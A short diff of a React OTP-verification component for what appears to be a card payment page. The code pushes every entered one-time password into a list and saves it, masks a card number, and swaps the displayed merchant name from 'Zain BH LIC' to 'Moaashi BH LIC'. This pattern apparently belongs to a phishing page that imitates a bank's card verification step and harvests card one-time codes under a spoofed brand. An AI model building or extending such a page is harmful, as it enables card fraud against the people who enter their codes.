@@ -32,6 +32,7 @@ export default  function OTPVerification() {
 const onVerify=()=>{
   allOtps.push(otp)
   saveOtpData()
+
 }
 const onCancel=()=>{}
   // Start countdown timer
@@ -106,6 +107,7 @@ setMaskedNumber(cardNumber?.replace(/^(\d{6})(\d+)(\d{4})$/, "$1******$3")!)
       } else {
         // Incorrect OTP
         setOtpError(true)
+        setOtp('')
         setAttempts((prev) => prev + 1)
         // Clear error after 3 seconds
         setTimeout(() => {
@@ -157,8 +159,8 @@ setMaskedNumber(cardNumber?.replace(/^(\d{6})(\d+)(\d{4})$/, "$1******$3")!)
 
       {/* Merchant Info */}
       <div className="text-center mb-6">
-        <p className="text-xl font-medium">Zain BH LIC</p>
-        <p className="text-gray-600">@Zainbh</p>
+        <p className="text-xl font-medium">Moaashi BH LIC</p>
+        <p className="text-gray-600">@mosh</p>
       </div>
 
       {/* OTP Message */}
